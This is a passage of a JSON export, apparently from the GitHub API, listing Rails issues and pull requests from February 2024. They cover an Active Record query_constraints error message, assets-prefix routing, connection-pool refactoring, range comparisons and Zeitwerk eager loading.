        "labels_url": "https://api.github.com/repos/rails/rails/issues/51164/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51164/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51164/events",
        "html_url": "https://github.com/rails/rails/issues/51164",
        "id": 2149141856,
        "node_id": "I_kwDNIULOgBlNYA",
        "number": 51164,
        "title": "`Model.query_constraints` with a single non-primary-key column raises a confusing error",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-22T13:59:58Z",
        "updated_at": "2024-02-23T00:27:31Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\nUsing `Model.query_constraints` with a single column that's not the primary key raises an error meant for passing more than 2 columns. This issue has existed since these raises were originally added in #49088.\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\", path: \"../rails\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :organisations, force: true do |t|\r\n  end\r\n\r\n  create_table :employees, force: true do |t|\r\n    t.integer :organisation_id\r\n  end\r\nend\r\n\r\nclass Organisation < ActiveRecord::Base\r\n  has_many :employees\r\nend\r\n\r\nclass Employee < ActiveRecord::Base\r\n  query_constraints :organisation_id\r\n\r\n  belongs_to :organisation\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_query_constraints_with_single_non_primary_key_column\r\n    org = Organisation.create!\r\n    org.employees << Employee.create!\r\n\r\n    assert_equal 1, org.employees.count  #  raises as it should, but with a confusing message\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\n\r\nIt turns out there is [already an appropriate error for this case](https://github.com/rails/rails/blob/9f1dec2ea5155205a880f6e6e232cf9ea6da2d8c/activerecord/lib/active_record/reflection.rb#L799-L806). We never reach it because of the incorrect condition for the error before. I would expect this to get raised:\r\n\r\n```ruby\r\nError:\r\nBugTest#test_association_stuff:\r\nArgumentError: The query constraints on the `Employee` model does not include the primary key so Active Record is unable to derive the foreign key constraints for the association. You need to explicitly define the query constraints for this association.\r\n    test_2.rb:45:in `test_query_constraints_with_single_non_primary_key_column'\r\n```\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\n\r\nRaises this error:\r\n\r\n```ruby\r\nError:\r\nBugTest#test_association_stuff:\r\nArgumentError: The query constraints list on the `Employee` model has more than 2 attributes. Active Record is unable to derive the query constraints for the association. You need to explicitly define the query constraints for this association.\r\n    test_2.rb:45:in `test_query_constraints_with_single_non_primary_key_column'\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3, main\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51164/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51164/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51163",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51163/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51163/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51163/events",
        "html_url": "https://github.com/rails/rails/issues/51163",
        "id": 2148914737,
        "node_id": "I_kwDNIULOgBXWMQ",
        "number": 51163,
        "title": "Setting an assets prefix leads to 405 errors on POST requests",
        "user": {
            "login": "maxlein",
            "id": 11796203,
            "node_id": "MDQ6VXNlcjExNzk2MjAz",
            "avatar_url": "https://avatars.githubusercontent.com/u/11796203?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/maxlein",
            "html_url": "https://github.com/maxlein",
            "followers_url": "https://api.github.com/users/maxlein/followers",
            "following_url": "https://api.github.com/users/maxlein/following{/other_user}",
            "gists_url": "https://api.github.com/users/maxlein/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/maxlein/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/maxlein/subscriptions",
            "organizations_url": "https://api.github.com/users/maxlein/orgs",
            "repos_url": "https://api.github.com/users/maxlein/repos",
            "events_url": "https://api.github.com/users/maxlein/events{/privacy}",
            "received_events_url": "https://api.github.com/users/maxlein/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-22T12:04:26Z",
        "updated_at": "2024-02-24T04:13:21Z",
        "closed_at": "2024-02-24T04:13:13Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "I try to get my app running under a special path with `RAILS_RELATIVE_URL_ROOT`.  \r\nI do that because my app runs in a kubernetes cluster and I need a specific route, e.g.: localhost/team-tracker  \r\nBut if I set the assets prefix path, the site and styles are working but the POST request are failing like that:  \r\n\r\n`POST http://127.0.0.1:3000/team-tracker/import_external_issues 405`\r\n\r\nRAILS_RELATIVE_URL_ROOT = /team-tracker\r\n\r\nI have my routes scoped like that:  \r\n\r\nroutes.rb  \r\n```\r\nRails.application.routes.draw do\r\n  \r\n  scope ENV['RAILS_RELATIVE_URL_ROOT'] || '/' do\r\n    resources :board_issues\r\n    resources :board_lists\r\n    resources :homes\r\n\r\n    post 'import_external_issues', to: 'issues#import_external_issues'\r\n\r\n  end\r\nend\r\n```\r\n\r\nThen I set an assets prefix, so that my assets are linked correctly:  \r\ndevelopment.rb   \r\n`  config.assets.prefix = ENV['RAILS_RELATIVE_URL_ROOT'] || '/assets'`\r\n\r\nBut this step breaks the POST requests.  \r\n\r\nAm I dong something wrong? Is there an easier way to use an ingress with a special route?\r\n\r\n### Steps to reproduce\r\n \r\nSet RAILS_RELATIVE_URL_ROOT and a corresponding assets prefix.  \r\n\r\n### Expected behavior\r\nPOST requests are working the same like without setting the assets prefix.\r\n\r\n### Actual behavior\r\nPOST requests don't work:\r\n`POST http://127.0.0.1:3000/team-tracker/import_external_issues 405`\r\n\r\n\r\n### System configuration\r\n**Rails version**: 7.1.2\r\n\r\n**Ruby version**: 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51163/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51163/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51162",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51162/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51162/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51162/events",
        "html_url": "https://github.com/rails/rails/pull/51162",
        "id": 2148706077,
        "node_id": "PR_kwDNIULOZ6Cytw",
        "number": 51162,
        "title": "Refactor InternalMetadata, MigrationContext to belong to the pool",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-22T10:17:01Z",
        "updated_at": "2024-02-22T12:04:56Z",
        "closed_at": "2024-02-22T12:04:56Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51162",
            "html_url": "https://github.com/rails/rails/pull/51162",
            "diff_url": "https://github.com/rails/rails/pull/51162.diff",
            "patch_url": "https://github.com/rails/rails/pull/51162.patch",
            "merged_at": "2024-02-22T12:04:56Z"
        },
        "body": "Extracted from: https://github.com/rails/rails/pull/50793\r\n\r\nSimilar to the recent refactoring of schema caches, rather than to directly hold a connection, they now hold a pool and checkout a connection when needed.\r\n\r\n~~NB: I did spot one leaky failure, to investigate: `bin/test --seed 26440`.~~",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51162/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51162/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51161",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51161/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51161/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51161/events",
        "html_url": "https://github.com/rails/rails/pull/51161",
        "id": 2148704260,
        "node_id": "PR_kwDNIULOZ6CsdQ",
        "number": 51161,
        "title": "Define AR migration-generator-default-database config",
        "user": {
            "login": "Sinclert",
            "id": 6978377,
            "node_id": "MDQ6VXNlcjY5NzgzNzc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6978377?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/Sinclert",
            "html_url": "https://github.com/Sinclert",
            "followers_url": "https://api.github.com/users/Sinclert/followers",
            "following_url": "https://api.github.com/users/Sinclert/following{/other_user}",
            "gists_url": "https://api.github.com/users/Sinclert/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/Sinclert/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/Sinclert/subscriptions",
            "organizations_url": "https://api.github.com/users/Sinclert/orgs",
            "repos_url": "https://api.github.com/users/Sinclert/repos",
            "events_url": "https://api.github.com/users/Sinclert/events{/privacy}",
            "received_events_url": "https://api.github.com/users/Sinclert/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-22T10:16:03Z",
        "updated_at": "2024-02-27T14:02:14Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51161",
            "html_url": "https://github.com/rails/rails/pull/51161",
            "diff_url": "https://github.com/rails/rails/pull/51161.diff",
            "patch_url": "https://github.com/rails/rails/pull/51161.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis PR defines a new Active Record configuration, to tune the default database that gets used when generating migrations.\r\n\r\nApplications that have sharded DBs, usually define a _primary_ database where most of the metadata / routing tables are, while keeping most of the data in the sharded DB instances. In these scenarios, most if not all of the schema-changes are created to target the sharded DB schemas, not the _primary_ one.\r\n\r\nMaking the default database migrations point to, configurable, simplifies developer experience.\r\n\r\n### Additional information\r\n\r\nThe lack of this configuration option is making Shopify to monkey patch the `MigrationGenerator` class.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51161/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51161/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51160",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51160/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51160/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51160/events",
        "html_url": "https://github.com/rails/rails/issues/51160",
        "id": 2148048008,
        "node_id": "I_kwDNIULOgAiciA",
        "number": 51160,
        "title": "7.1.3.2 may have broken stimulus controllers",
        "user": {
            "login": "salex",
            "id": 125716,
            "node_id": "MDQ6VXNlcjEyNTcxNg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/125716?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/salex",
            "html_url": "https://github.com/salex",
            "followers_url": "https://api.github.com/users/salex/followers",
            "following_url": "https://api.github.com/users/salex/following{/other_user}",
            "gists_url": "https://api.github.com/users/salex/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/salex/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/salex/subscriptions",
            "organizations_url": "https://api.github.com/users/salex/orgs",
            "repos_url": "https://api.github.com/users/salex/repos",
            "events_url": "https://api.github.com/users/salex/events{/privacy}",
            "received_events_url": "https://api.github.com/users/salex/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-22T02:19:39Z",
        "updated_at": "2024-02-22T20:33:43Z",
        "closed_at": "2024-02-22T20:33:37Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nI happen to be creating a new Rails test app a few hours ago  when 7.1.3.2 was released. \r\n\r\nA stimulus controller I've used for years all of a sudden produced an error\r\n\r\n```ruby\r\nThe resource http://localhost:3000/assets/controllers/flashIt.controller-\r\nd7fc6bd02d113b8faec8c95d343483bb35099e6a6f269f9a13f0de5796578850.js \r\nwas preloaded using link preload but not used within a few seconds from the window's load event.\r\n Please make sure it wasn't preloaded for nothing.\r\n```\r\n\r\nThe markup that loads the controller\r\n\r\n```slim\r\ndiv.col-span-6\r\n      - flash.each do |name, msg|\r\n        - if msg.is_a?(String)\r\n          .flash-box.w3-animate-right.p-2[\r\n            data-controller=\"flashIt\" \r\n            data-flashIt-target=\"flashBox\" \r\n            class=\"#{name.to_s == 'notice' ? 'text-green-500 bg-green-100 px-4' : 'p-2 text-red-500 bg-red-100 px-4'}\"\r\n          ]\r\n            = content_tag :span, content_tag(:strong,msg)\r\n```\r\n\r\nThe controller\r\n\r\n```javascript\r\nimport { Controller } from \"@hotwired/stimulus\"\r\n\r\nexport default class extends Controller {\r\n  static targets = [ \"flashBox\" ]\r\n\r\n  connect() {\r\n    this.closeFlashIt()\r\n  }\r\n\r\n  closeFlashIt(){\r\n    var box = this.flashBoxTarget\r\n    setTimeout(function () {\r\n      var op = 1;  // initial opacity\r\n        var timer = setInterval(function () {\r\n            if (op <= 0.1){\r\n                clearInterval(timer);\r\n                box.style.display = 'none';\r\n            }\r\n            box.style.opacity = op;\r\n            box.style.filter = 'alpha(opacity=' + op * 100 + \")\";\r\n            op -= op * 0.1;\r\n        }, 500);\r\n    }, 10000);\r\n  }\r\n}\r\n```\r\nThe flash message will show up if there is a flash message, but it won't fade out.\r\n\r\nThe message first shows up in the js console shortly after the page is loaded (it's on every page since it's in the menubar. I opened the console when the message did not fade out.\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3.2\r\n\r\n**Ruby version**: 3.2\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51160/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51160/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51159",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51159/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51159/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51159/events",
        "html_url": "https://github.com/rails/rails/pull/51159",
        "id": 2147990894,
        "node_id": "PR_kwDNIULOZ5b4bg",
        "number": 51159,
        "title": "Fix beginless and endless range comparisons",
        "user": {
            "login": "AlexMooney",
            "id": 8269566,
            "node_id": "MDQ6VXNlcjgyNjk1NjY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8269566?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/AlexMooney",
            "html_url": "https://github.com/AlexMooney",
            "followers_url": "https://api.github.com/users/AlexMooney/followers",
            "following_url": "https://api.github.com/users/AlexMooney/following{/other_user}",
            "gists_url": "https://api.github.com/users/AlexMooney/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/AlexMooney/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/AlexMooney/subscriptions",
            "organizations_url": "https://api.github.com/users/AlexMooney/orgs",
            "repos_url": "https://api.github.com/users/AlexMooney/repos",
            "events_url": "https://api.github.com/users/AlexMooney/events{/privacy}",
            "received_events_url": "https://api.github.com/users/AlexMooney/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-22T01:23:49Z",
        "updated_at": "2024-02-27T23:55:11Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51159",
            "html_url": "https://github.com/rails/rails/pull/51159",
            "diff_url": "https://github.com/rails/rails/pull/51159.diff",
            "patch_url": "https://github.com/rails/rails/pull/51159.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because some endless and beginless range comparisons raise `RangeError` due to `ActiveSupport::CompareWithRange`\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the `CompareWithRange#===` and `CompareWithRange#include?` methods to support begin and endless ranges on the left and right hand side of the comparison.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nPOR:\r\n```ruby\r\n> (1..) === (2..)\r\n=> false\r\n> (..1) === (..2)\r\n=> false\r\n```\r\nRails 7.1.3:\r\n```ruby\r\n> (1..) === (2..)\r\nRangeError: cannot get the last element of endless range\r\nfrom /activesupport-7.1.3/lib/active_support/core_ext/range/compare_range.rb:23:in `last'\r\n> (..1) === (..2)\r\nRangeError: cannot get the first element of beginless range\r\nfrom /activesupport-7.1.3/lib/active_support/core_ext/range/compare_range.rb:24:in `first'\r\n```\r\nThis PR:\r\n```ruby\r\n> (1..) === (2..)\r\n=> true\r\n> (2..) === (1..)\r\n=> false\r\n> (..1) === (..2)\r\n=> false\r\n> (..2) === (..1)\r\n=> true\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51159/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51159/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51158",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51158/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51158/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51158/events",
        "html_url": "https://github.com/rails/rails/issues/51158",
        "id": 2147969677,
        "node_id": "I_kwDNIULOgAdqjQ",
        "number": 51158,
        "title": "ActiveRecord queries against an unmigrated database breaks Zeitwerk",
        "user": {
            "login": "shamas-",
            "id": 3161602,
            "node_id": "MDQ6VXNlcjMxNjE2MDI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3161602?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/shamas-",
            "html_url": "https://github.com/shamas-",
            "followers_url": "https://api.github.com/users/shamas-/followers",
            "following_url": "https://api.github.com/users/shamas-/following{/other_user}",
            "gists_url": "https://api.github.com/users/shamas-/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/shamas-/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/shamas-/subscriptions",
            "organizations_url": "https://api.github.com/users/shamas-/orgs",
            "repos_url": "https://api.github.com/users/shamas-/repos",
            "events_url": "https://api.github.com/users/shamas-/events{/privacy}",
            "received_events_url": "https://api.github.com/users/shamas-/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-22T00:58:48Z",
        "updated_at": "2024-02-22T20:18:25Z",
        "closed_at": "2024-02-22T17:59:43Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n1. Define a `has_and_belongs_to_many` relationship on a model, for example\r\n```ruby\r\nclass Apple < ApplicationRecord\r\n  has_and_belongs_to_many :oranges\r\nend\r\n```\r\n2. Setup the relationship using `create_join_table` in a migration file\r\n3. Write code to use the relationship such as\r\n```ruby\r\n# file.rb\r\nApple.joins(:oranges).first #line 1\r\n```\r\n4. Use `schema_format = :sql`\r\n5. Run the migration from step 2 to update db/structure.sql\r\n6. Roll the database back\r\n7. Run `bin/rails zeitwerk:check`\r\n\r\n### Expected behavior\r\n7. \"All is good!\" output\r\n\r\n### Actual behavior\r\n6. This is output:\r\n```\r\nActiveRecord::StatementInvalid: PG::UndefinedTable: ERROR:  relation \"oranges_apples\" does not exist\r\nLINE 1: ...* FROM \"apples\" INNER JOIN \"oranges...\r\n\r\n/Users/person/file.rb:1\r\n```\r\n\r\n### Commentary\r\nThe obvious solution is to run the migration. However, it's not always possible to run the migration before running some other code that Zeitwerk will eager load on. For example in a production scenario I need to build the deployment and then run the migration later through the built deployment code. During asset precompilation in the build phase I am seeing the above style of error in connection with this kind of error:\r\n\r\n```\r\n       ERROR in ./app/javascript/other/afile1.js.erb\r\n       Module build failed (from ./node_modules/rails-erb-loader/index.js):\r\n       Error: rails-erb-loader failed with code: 1\r\n           at ChildProcess.<anonymous> (/tmp/build_6e8198a8/node_modules/rails-erb-loader/index.js:128:16)\r\n           at ChildProcess.emit (node:events:514:28)\r\n           at maybeClose (node:internal/child_process:1105:16)\r\n           at ChildProcess._handle.onexit (node:internal/child_process:305:5)\r\n        @ ./app/javascript/application.js 5:187-232\r\n       \r\n       webpack 5.76.3 compiled with 1 error in 10796 ms\r\n```\r\n\r\n@fxn \r\n\r\n### System configuration\r\n**Rails version**: 7.0.8\r\n\r\n**Ruby version**: 3.1.4\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51158/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51158/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51157",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51157/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51157/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51157/events",
        "html_url": "https://github.com/rails/rails/pull/51157",
        "id": 2147867776,
        "node_id": "PR_kwDNIULOZ5VS3A",
        "number": 51157,
        "title": "[ci skip] Update ActiveStorage Docs",
        "user": {
            "login": "aveedibya",
            "id": 5461802,
            "node_id": "MDQ6VXNlcjU0NjE4MDI=",
